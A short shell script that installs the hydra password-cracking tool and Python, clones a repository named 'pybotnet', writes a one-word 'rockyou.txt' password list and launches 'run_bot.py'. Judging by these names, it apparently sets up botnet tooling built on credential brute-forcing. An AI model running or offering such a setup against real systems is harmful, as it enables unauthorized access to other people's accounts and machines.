#!/bin/sh
sudo apt-get install git hydra python3 python3-pip
git clone https://github.com/laudecay/pybotnet.git
echo 'password' > pybotnet/rockyou.txt
sudo apt-get install python3
cd pybotnet
pip3 install -r requirements.txt
python3 run_bot.py
